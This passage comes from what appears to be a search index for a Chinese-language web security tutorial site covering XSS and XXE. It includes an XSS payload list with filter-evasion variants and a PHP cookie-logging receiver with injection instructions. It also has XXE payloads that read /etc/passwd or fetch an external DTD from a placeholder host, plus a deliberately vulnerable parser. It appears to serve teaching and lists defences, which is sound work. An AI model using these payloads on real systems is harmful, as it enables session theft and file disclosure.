<p>\u8fd9\u5c31\u662f\u6700\u7b80\u5355\u7684xss\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u4e86\uff0c\u9ed1\u5ba2\u53ea\u9700\u8981\u6784\u9020\u597durl\u8bf1\u4f7f\u7528\u6237\u70b9\u51fb\uff0c\u5982\u679c\u7528\u6237\u8bbf\u95ee\u4e86\u8be5url\uff0c\u90a3\u4e48\u4e86\u4f60\u7684cookie\u5c31\u4f1a\u88ab\u53d1\u9001\u5230\u9ed1\u5ba2\u7684\u670d\u52a1\u5668\uff0c\u9ed1\u5ba2\u5c31\u53ef\u4ee5\u4f7f\u7528\u4f60\u7684\u8eab\u4efd\u6765\u767b\u5f55\u7f51\u7ad9\u4e86\uff0c\u5371\u5bb3\u53ef\u60f3\u800c\u77e5\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_3","title":"\u6f0f\u6d1e\u5206\u7c7b\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_4","title":"\u53cd\u5c04\u578b\uff1a","text":"<p>\u6ce8\u5165\u7684JS\u811a\u672c\u662f\u4e00\u6b21\u6027\u7684\uff0c\u4e0d\u4f1a\u5b58\u5728\u4e8e\u7f51\u7ad9\u4e0a\uff0c\u53ea\u6709\u7528\u6237\u70b9\u51fb\u4e86\u7279\u5b9a\u7684url\u540e\u624d\u4f1a\u89e6\u53d1\uff0c\u4f8b\u5982\u4e0a\u9762\u7684\u793a\u4f8b\uff0c\u4ee3\u7801\uff1a<code>http://127.0.0.1/xss.php?id=&lt;script&gt;alert(\"\u767d\u6cfdSec\")&lt;/script&gt;</code>\uff0c\u53ea\u6709\u7528\u6237\u70b9\u51fb\u624d\u4f1a\u5f39\u7a97\uff0c\u5426\u5219\u4e0d\u4f1a\u89e6\u53d1</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_5","title":"\u5b58\u50a8\u578b\uff1a","text":"<p>\u6ce8\u5165\u7684JS\u811a\u672c\u662f\u4fdd\u5b58\u5230\u7f51\u7ad9\u670d\u52a1\u5668\u7aef\u7684\uff0c\u6bd4\u5982\u5c06<code>&lt;script&gt;alert(\"\u767d\u6cfdSec\")&lt;/script&gt;</code>\u5f53\u4f5c\u7528\u6237\u540d\u4fdd\u5b58\u5230\u7f51\u7ad9\u4e0a\uff0c\u5982\u679c\u7f51\u7ad9\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u90a3\u4e48\u6bcf\u5f53\u6709\u4eba\u6d4f\u89c8\u5230\u4f60\u7684\u7528\u6237\u540d\uff0c\u5c31\u4f1a\u89e6\u53d1JS\u4ee3\u7801</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#dom","title":"DOM\u578b\uff1a","text":"<p>\u548c\u53cd\u5c04\u578bXSS\u8f83\u4e3a\u7c7b\u4f3c\uff0c\u4e0d\u8fc7DOM\u578b\u6ce8\u5165\u7684JS\u811a\u672c\u4e0d\u7ecf\u8fc7\u540e\u7aef\u7684\u5904\u7406\uff0c\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u624d\u548c\u53cd\u5c04\u578bxss\u533a\u5206\u5f00\uff0c\u4e0b\u9762\u4e3e\u4e2a\u4f8b\u5b50\u8bb2\u89e3DOM\u578bXSS\u6f0f\u6d1e</p> <p>HTML\u4ee3\u7801\uff1a</p> <pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt; \u767d\u6cfdSec &lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;script&gt;\n            window.onload= function(){\n                var p=document.getElementById(\"p\")\n                var Text=document.getElementById(\"text1\");\n                var Btn=document.getElementById(\"Btn\");\n                Btn.onclick = function(){\n                    p.innerHTML = Text.value + \"&lt;br/&gt;\";\n                    Text.value=\"\"\n                };\n            }\n        &lt;/script&gt;\n        &lt;p id=\"p\"&gt;\u767d\u6cfdSec&lt;/p&gt;\n        &lt;input type=\"text\" id=\"text1\"/&gt;\n        &lt;input id=\"Btn\" type=\"button\" value=\"\u63d0\u4ea4\"/&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p></p> <p>\u5728\u8fd9\u4e2a\u9875\u9762\u4e2d\uff0c\u6211\u4eec\u8f93\u5165\u7684\u6570\u636e\u662f\u7531\u524d\u7aef\u7684JS\u811a\u672c\u63a7\u5236\u7684\uff0c\u76f4\u63a5\u8f93\u51fa\u5728\u4e86\u6807\u7b7ep\u4e2d\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8f93\u5165\u7684\u503c\u4e3a<code>&lt;img src=11 onerror=alert(\"\u767d\u6cfdSec\")&gt;</code>\uff0c\u90a3\u4e48\u4f1a\u76f4\u63a5\u8f93\u51fa\u4ece\u800c\u4ea7\u751fxss\u6f0f\u6d1e\uff0c\u5982\u4e0b\u56fe</p> <p></p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_6","title":"\u6f0f\u6d1e\u68c0\u6d4b\uff1a","text":"<p>\u5728\u53ef\u4ee5\u63d0\u4ea4\u6570\u636e\u7684\u5730\u65b9\u63d2\u5165\u6d4b\u8bd5\u5f39\u7a97\u7684\u4ee3\u7801\uff0c\u5982\u679c\u6210\u529f\u5f39\u7a97\uff0c\u5373\u5b58\u5728xss\u6f0f\u6d1e\uff0c\u5b9e\u9645\u60c5\u51b5\u4e2d\u4f1a\u5b58\u5728\u5f88\u591a\u60c5\u51b5\uff0c\u4f8b\u5982\u6211\u4eec\u63d2\u5165\u7684\u4ee3\u7801\u8f93\u51fa\u5728\u5176\u4ed6\u6807\u7b7e\u4e2d\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5148\u95ed\u5408\u8fd9\u4e9b\u6807\u7b7e\uff0c\u4e5f\u6709\u7684\u5730\u65b9\u4f1a\u6709\u8fc7\u6ee4\uff0c\u4f46\u662f\u6709\u53ef\u80fd\u8fc7\u6ee4\u7684\u4e0d\u5b8c\u5168\uff0c\u4e5f\u4f1a\u9020\u6210xss\u6f0f\u6d1e\uff0c\u5c31\u9700\u8981\u6211\u4eec\u4e0d\u65ad\u5730\u6d4b\u8bd5\u3002</p> <p>\u7ed9\u51fa\u4e00\u4e9b\u5e38\u7528\u7684\u4ee3\u7801\uff1a</p> <pre><code>&lt;script&gt;alert(xss)&lt;/script&gt; \n&lt;script&gt;alert(/xss/)&lt;/script&gt;\n'&gt;&lt;script&gt;alert(xss)&lt;/script&gt; \n\"&gt;&lt;script&gt;alert(xss)&lt;/script&gt; \n&lt;scr&lt;script&gt;ipt&gt;alert(xss)&lt;/scr&lt;/script&gt;ipt&gt; \n&lt;ScRiPt&gt;alert(xss)&lt;/ScRiPt&gt;\n'&gt;&lt;ScRiPt&gt;alert(xss)&lt;/ScRiPt&gt;\n\"&lt;ScRiPt&gt;alert(xss)&lt;/ScRiPt&gt;\n&lt;javascript:alert(xss)&gt;\n' onfocus=javascript:alert(xss)&gt;\n\"&gt; &lt;a href=javascript:alert('xss') &gt; xss&lt;/a&gt;\n\"&gt; &lt;a HrEf=javascript:alert('xss') &gt; xss&lt;/a&gt;\n&lt;img src=1 onerror=alert(xss)&gt;\n&lt;Img src=1 onErrOr=AleRt(xss)&gt;\n&lt;IMG SRC=\"\" onerror=\"alert('XSS')\"&gt;\n&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; \n&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; \n&amp;#60;script&amp;#62;alert(xss)&amp;#60;/script&amp;#62;\n</code></pre> <p>\u9488\u5bf9waf\u7b49\u8fc7\u6ee4\u62e6\u622a\u81ea\u884cFUZZ\u5373\u53ef\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_7","title":"\u6f0f\u6d1e\u5229\u7528\uff1a","text":"<p>\u8fd9\u91cc\u7ed9\u51fa\u7b80\u5355\u7684\u5229\u7528\u4ee3\u7801</p> <p>xss.php</p> <pre><code>&lt;?\n$cookie=$_GET['cookie'];\n$referer=$_SERVER['HTTP_REFERER'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$file=fopen('cookie.txt','a');\nfwrite($file,\"\u5730\u5740\u4e3a\uff1a\".$referer.\"\\r\\n\".\"cookie\u4e3a\uff1a\".$cookie.\"\\r\\n\".\"ip\u4e3a\uff1a\".$ip.\"\\r\\n\".\"****************************************\".\"\\r\\n\");\nfclose($file);\n?&gt;\n</code></pre> <p>\u5c06\u4e0a\u9762\u4ee3\u7801\u4fdd\u5b58\u4e3a\u4f60\u7684\u7f51\u7ad9\u9875\u9762\uff0c\u4f8b\u5982\uff1a127.0.0.1/xss.php\uff0c\u5728\u53ef\u80fd\u51fa\u73b0xss\u7684\u5730\u65b9\u4f7f\u7528\u6807\u7b7e\u63d2\u5165\u4f60\u7684\u94fe\u63a5\u5e26\u4e0a?cookie=document.cookie\u5c31\u53ef\u4ee5\u4e86\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_8","title":"\u5e38\u89c1\u573a\u666f\uff1a","text":"<p>\u641c\u7d22\u6846\uff0c\u4e2a\u4eba\u4fe1\u606f\u680f\u7b49\u9700\u8981\u7528\u6237\u63d0\u4ea4\u6570\u636e\u5e76\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u7684\u5730\u65b9\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_9","title":"\u6f0f\u6d1e\u9632\u5fa1\uff1a","text":"<p>WAF\u62e6\u622a\u654f\u611f\u5b57\u7b26</p> <p>Filter\uff0c\u4ee3\u7801\u5c42\u9762\u8fc7\u6ee4\u654f\u611f\u5b57\u7b26</p> <p>htmlspecialchars()</p> <p>Httponly</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/","title":"XXE\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#xml","title":"XML\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#xml_1","title":"XML\u7b80\u4ecb\uff1a","text":"<p>XXE(XML External  Entity Injection)  XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff0cXML\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8eHTML\uff08\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\uff09\u7684\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00\uff0c\u662f\u7528\u4e8e\u6807\u8bb0\u7535\u5b50\u6587\u4ef6\u4f7f\u5176\u5177\u6709\u7ed3\u6784\u6027\u7684\u6807\u8bb0\u8bed\u8a00\uff0c\u53ef\u4ee5\u7528\u6765\u6807\u8bb0\u6570\u636e\u3001\u5b9a\u4e49\u6570\u636e\u7c7b\u578b\uff0c\u662f\u4e00\u79cd\u5141\u8bb8\u7528\u6237\u5bf9\u81ea\u5df1\u7684\u6807\u8bb0\u8bed\u8a00\u8fdb\u884c\u5b9a\u4e49\u7684\u6e90\u8bed\u8a00\u3002XML\u6587\u6863\u7ed3\u6784\u5305\u62ecXML\u58f0\u660e\u3001DTD\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff08\u53ef\u9009\uff09\u3001\u6587\u6863\u5143\u7d20\u3002</p> <p>\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff08DTD\uff09\u53ef\u5b9a\u4e49\u5408\u6cd5\u7684XML\u6587\u6863\u6784\u5efa\u6a21\u5757\u3002\u5b83\u4f7f\u7528\u4e00\u7cfb\u5217\u5408\u6cd5\u7684\u5143\u7d20\u6765\u5b9a\u4e49\u6587\u6863\u7684\u7ed3\u6784\u3002</p> <p>DTD \u53ef\u88ab\u6210\u884c\u5730\u58f0\u660e\u4e8e XML \u6587\u6863\u4e2d\uff0c\u4e5f\u53ef\u4f5c\u4e3a\u4e00\u4e2a\u5916\u90e8\u5f15\u7528\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#doctype","title":"\u5185\u90e8\u7684 DOCTYPE \u58f0\u660e","text":"<p>\u5047\u5982 DTD \u88ab\u5305\u542b\u5728\u60a8\u7684 XML \u6e90\u6587\u4ef6\u4e2d\uff0c\u5b83\u5e94\u5f53\u901a\u8fc7\u4e0b\u9762\u7684\u8bed\u6cd5\u5305\u88c5\u5728\u4e00\u4e2a DOCTYPE \u58f0\u660e\u4e2d\uff1a</p> <pre><code>&lt;!DOCTYPE \u6839\u5143\u7d20 [\u5143\u7d20\u58f0\u660e]&gt;\n</code></pre> <p>\u5e26\u6709 DTD \u7684 XML \u6587\u6863\u5b9e\u4f8b\uff1a</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note [\n&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to      (#PCDATA)&gt;\n&lt;!ELEMENT from    (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body    (#PCDATA)&gt;\n]&gt;\n&lt;note&gt;\n&lt;to&gt;George&lt;/to&gt;\n&lt;from&gt;John&lt;/from&gt;\n&lt;heading&gt;Reminder&lt;/heading&gt;\n&lt;body&gt;Don't forget the meeting!&lt;/body&gt;\n&lt;/note&gt;\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u4ee3\u7801\uff0c\u505a\u51fa\u5982\u4e0b\u89e3\u91ca</p> <p>!DOCTYPE note (\u7b2c\u4e8c\u884c)\u5b9a\u4e49\u6b64\u6587\u6863\u662f note \u7c7b\u578b\u7684\u6587\u6863\u3002</p> <p>!ELEMENT note (\u7b2c\u4e09\u884c)\u5b9a\u4e49 note \u5143\u7d20\u6709\u56db\u4e2a\u5143\u7d20\uff1a\"to\u3001from\u3001heading,\u3001body\"</p> <p>!ELEMENT to (\u7b2c\u56db\u884c)\u5b9a\u4e49 to \u5143\u7d20\u4e3a \"#PCDATA\" \u7c7b\u578b</p> <p>!ELEMENT from (\u7b2c\u4e94\u884c)\u5b9a\u4e49 from \u5143\u7d20\u4e3a \"#PCDATA\" \u7c7b\u578b</p> <p>!ELEMENT heading (\u7b2c\u516d\u884c)\u5b9a\u4e49 heading \u5143\u7d20\u4e3a \"#PCDATA\" \u7c7b\u578b</p> <p>!ELEMENT body (\u7b2c\u4e03\u884c)\u5b9a\u4e49 body \u5143\u7d20\u4e3a \"#PCDATA\" \u7c7b\u578b</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_1","title":"\u5916\u90e8\u6587\u6863\u58f0\u660e","text":"<p>\u5047\u5982 DTD \u4f4d\u4e8e XML \u6e90\u6587\u4ef6\u7684\u5916\u90e8\uff0c\u90a3\u4e48\u5b83\u5e94\u901a\u8fc7\u4e0b\u9762\u7684\u8bed\u6cd5\u88ab\u5c01\u88c5\u5728\u4e00\u4e2a DOCTYPE \u5b9a\u4e49\u4e2d\uff1a</p> <pre><code>&lt;!DOCTYPE \u6839\u5143\u7d20 SYSTEM \"\u6587\u4ef6\u540d\"&gt;\n</code></pre> <p>\u8fd9\u4e2a XML \u6587\u6863\u548c\u4e0a\u9762\u7684 XML \u6587\u6863\u76f8\u540c\uff0c\u4f46\u662f\u62e5\u6709\u4e00\u4e2a\u5916\u90e8\u7684 DTD:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;\n&lt;note&gt;\n&lt;to&gt;George&lt;/to&gt;\n&lt;from&gt;John&lt;/from&gt;\n&lt;heading&gt;Reminder&lt;/heading&gt;\n&lt;body&gt;Don't forget the meeting!&lt;/body&gt;\n&lt;/note&gt; \n</code></pre> <p>\u8fd9\u662f\u5305\u542b DTD \u7684 \"note.dtd\" \u6587\u4ef6\uff1a</p> <pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;\n</code></pre> <p>\u901a\u8fc7 DTD\uff0c\u60a8\u7684\u6bcf\u4e00\u4e2a XML \u6587\u4ef6\u5747\u53ef\u643a\u5e26\u4e00\u4e2a\u6709\u5173\u5176\u81ea\u8eab\u683c\u5f0f\u7684\u63cf\u8ff0\u3002</p> <p>\u901a\u8fc7 DTD\uff0c\u72ec\u7acb\u7684\u56e2\u4f53\u53ef\u4e00\u81f4\u5730\u4f7f\u7528\u67d0\u4e2a\u6807\u51c6\u7684 DTD \u6765\u4ea4\u6362\u6570\u636e\u3002</p> <p>\u800c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4f7f\u7528\u67d0\u4e2a\u6807\u51c6\u7684 DTD \u6765\u9a8c\u8bc1\u4ece\u5916\u90e8\u63a5\u6536\u5230\u7684\u6570\u636e\u3002</p> <p>\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528 DTD \u6765\u9a8c\u8bc1\u60a8\u81ea\u8eab\u7684\u6570\u636e\u3002</p> <p>\u5b66\u4e60\u4e86DTD\u7684\u4e24\u79cd\u5f15\u7528\u65b9\u6cd5\uff0c\u4e0b\u9762\u6211\u4eec\u4e3b\u8981\u5b66\u4e60\u4ee5\u4e0bXXE\u6f0f\u6d1e\u9700\u8981\u5229\u7528\u7684DTD\u5b9e\u4f53</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_2","title":"\u5b9e\u4f53\u7684\u6982\u5ff5\uff1a","text":"<p>\u5b9e\u4f53\u662f\u7528\u4e8e\u5b9a\u4e49\u5f15\u7528\u666e\u901a\u6587\u672c\u6216\u7279\u6b8a\u5b57\u7b26\u7684\u5feb\u6377\u65b9\u5f0f\u7684\u53d8\u91cf\u3002</p> <p>\u5b9e\u4f53\u5f15\u7528\u662f\u5bf9\u5b9e\u4f53\u7684\u5f15\u7528\u3002</p> <p>\u5b9e\u4f53\u53ef\u5728\u5185\u90e8\u6216\u5916\u90e8\u8fdb\u884c\u58f0\u660e\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_3","title":"\u4e00\u4e2a\u5185\u90e8\u5b9e\u4f53\u58f0\u660e","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_4","title":"\u8bed\u6cd5\uff1a","text":"<pre><code>&lt;!ENTITY \u5b9e\u4f53\u540d\u79f0 \"\u5b9e\u4f53\u7684\u503c\"&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_5","title":"\u4f8b\u5b50\uff1a","text":"<p>DTD \u4f8b\u5b50:</p> <pre><code>&lt;!ENTITY writer \"Bill Gates\"&gt;\n&lt;!ENTITY copyright \"Copyright W3School.com.cn\"&gt;\n</code></pre> <p>XML \u4f8b\u5b50:</p> <pre><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;\n</code></pre> <p>\u6ce8\u91ca: \u4e00\u4e2a\u5b9e\u4f53\u7531\u4e09\u90e8\u5206\u6784\u6210: \u4e00\u4e2a\u548c\u53f7 (&amp;), \u4e00\u4e2a\u5b9e\u4f53\u540d\u79f0, \u4ee5\u53ca\u4e00\u4e2a\u5206\u53f7 (;)\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_6","title":"\u4e00\u4e2a\u5916\u90e8\u5b9e\u4f53\u58f0\u660e","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_7","title":"\u8bed\u6cd5\uff1a","text":"<pre><code>&lt;!ENTITY \u5b9e\u4f53\u540d\u79f0 SYSTEM \"URI/URL\"&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_8","title":"\u4f8b\u5b50\uff1a","text":"<p>DTD \u4f8b\u5b50:</p> <pre><code>&lt;!ENTITY writer SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\"&gt;\n&lt;!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\"&gt;\n</code></pre> <p>XML \u4f8b\u5b50:</p> <pre><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;\n</code></pre> <p>\u6709\u4e86\u4ee5\u4e0a\u7684XML\u548cDTD\u7684\u77e5\u8bc6\u57fa\u7840\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b66\u4e60XXE\u6f0f\u6d1e\u4e86\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#xxexmlxml-external-entity","title":"XXE\u6f0f\u6d1e\u2014\u2014XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165(XML External Entity)","text":"<p>\u5f53\u5e94\u7528\u662f\u901a\u8fc7\u7528\u6237\u4e0a\u4f20\u7684XML\u6587\u4ef6\u6216POST\u8bf7\u6c42\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93\uff0c\u5e76\u4e14\u5e94\u7528\u6ca1\u6709\u7981\u6b62XML\u5f15\u7528\u5916\u90e8\u5b9e\u4f53\uff0c\u4e5f\u6ca1\u6709\u8fc7\u6ee4\u7528\u6237\u63d0\u4ea4\u7684XML\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751fXML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5373XXE\u6f0f\u6d1e</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#1","title":"\u4f8b1\uff1a","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;x&gt;&amp;b;&lt;/x&gt;\n</code></pre> <p>\u5982\u679c\u4ee5\u4e0axml\u4ee3\u7801\u88ab\u89e3\u6790\uff0c\u5219\u4f1a\u8fd4\u56de/etc/passwd\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#2","title":"\u4f8b2\uff1a","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE a [&lt;!ENTITY % d SYSTEM \"http://xxx.com/xxe.dtd\" &gt;\n%d;\n]&gt;\n&lt;x&gt;&amp;xxe;&lt;/x&gt;\n</code></pre> <p>http://xxxx.com/xxe.dtd\u7684\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;\n</code></pre> <p>\u6709\u7684\u5c0f\u4f19\u4f34\u53ef\u80fd\u5df2\u7ecf\u53d1\u73b0\u4e86\uff0c\u4f8b1\u4e2d\u5b9e\u4f53\u540d\u524d\u9762\u5e76\u6ca1\u6709%\uff0c\u800c\u4f8b2\u4e2d\u5b9e\u4f53\u540d\u524d\u662f\u6709%\u7684\uff0c\u8fd9\u91cc\u7684\u533a\u522b\u5728\u4e8e\uff0c\u4f8b1\u4e2d\u5b9a\u4e49\u7684\u5b9e\u4f53\u662f\u901a\u7528\u5b9e\u4f53\uff0c\u800c\u4f8b2\u4e2d\u5b9a\u4e49\u7684\u662f\u53c2\u6570\u5b9e\u4f53\uff0c\u5e76\u4e14\u53c2\u6570\u5b9e\u4f53\u53ea\u80fd\u5728dtd\u4e2d\u4f7f\u7528\uff0c\u5373\u4f8b2\u4ee3\u7801\u4e2d\u7684\u7b2c\u4e09\u884c %d;\uff0c\u8fd9\u91cc\u5c31\u50cf\u5728\u5916\u9762\u5f15\u7528\u7edf\u7528\u5b9e\u4f53\u4e00\u6837\uff0c\u8fd9\u91cc\u7684%d;\u5c31\u5f15\u7528\u4e86http://xxx.com/xxe.dtd\u8fd9\u4e2a\u6587\u4ef6\u5230dtd\u4e2d\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#3","title":"\u4f8b3\uff1a","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE a SYSTEM \"http://xxx.com/xxe.dtd\"&gt;\n&lt;x&gt;&amp;xxe;&lt;/x&gt;\n</code></pre> <p>http://xxxx.com/xxe.dtd\u7684\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;\n</code></pre> <p>\u4e0d\u540c\u7a0b\u5e8f\u652f\u6301\u7684\u534f\u8bae\u4e0d\u540c\uff0c\u5982\u4e0b\u56fe\uff1a</p> LIBXML2 PHP JAVA .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar <p>\u4ee5\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u80fd\u8fd8\u662f\u8bf4\u7684\u4e0d\u592a\u6e05\u695a\uff0c\u90a3\u6211\u4eec\u5c31\u7528\u4e00\u4e2a\u5b9e\u4f8b\u6765\u770b\u4e00\u4e0bXXE\u6f0f\u6d1e\u5230\u5e95\u662f\u4ec0\u4e48\u4e1c\u897f\uff1a</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#1_1","title":"\u5b9e\u4f8b1\uff1a","text":"<p>\u73af\u5883\u8bbe\u7f6e</p> <p>PHPstudy\u96c6\u6210 Apache2.4.39 PHP5.2.17nts</p> <p>xxe.php\u540e\u7aef\u4ee3\u7801</p> <pre><code>&lt;?php\nlibxml_disable_entity_loader (false);\n$xmlfile = file_get_contents('php://input');\n$dom = new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$creds = simplexml_import_dom($dom);\necho $creds;\n?&gt;\n</code></pre> <p>\u8bbf\u95ee</p> <p></p> <p>\u5237\u65b0\u5e76\u6293\u5305\uff0cPOST\u6211\u4eec\u6784\u9020\u7684payload</p> <p></p> <p>\u53d1\u5305\u8fd4\u56de\u6211\u4eec\u67e5\u770b\u7684c:/windows/system.ini</p> <p></p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#_9","title":"\u8bfb\u53d6\u6587\u4ef6\u65f6\u6709\u7279\u6b8a\u7b26\u53f7","text":"<p>\u5728\u8bfb\u53d6\u6587\u4ef6\u65f6\uff0c\u6587\u4ef6\u4e2d\u5305\u542b\"&lt;,&gt;,&amp;\"\u7b49\u8fd9\u4e9b\u7279\u6b8a\u7b26\u53f7\u65f6\uff0c\u4f1a\u88abxml\u89e3\u6790\u5668\u89e3\u6790\uff0c\u62a5\u9519\u4ece\u800c\u5bfc\u81f4\u8bfb\u53d6\u5931\u8d25\uff0c\u4f8b\u5982\u5c1d\u8bd5\u8bfb\u53d6\u4ee5\u4e0b\u6587\u4ef6</p> <p>C:\\test.txt</p> <p>\u5185\u5bb9\uff1a</p> <pre><code>&lt;Baize Sec&gt;\n</code></pre> <p>payload:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE creds [&lt;!ENTITY xxe SYSTEM \"file:///c:/test.txt\"&gt;]&gt;\n&lt;creds&gt;&amp;xxe;&lt;/creds&gt;\n</code></pre> <p></p> 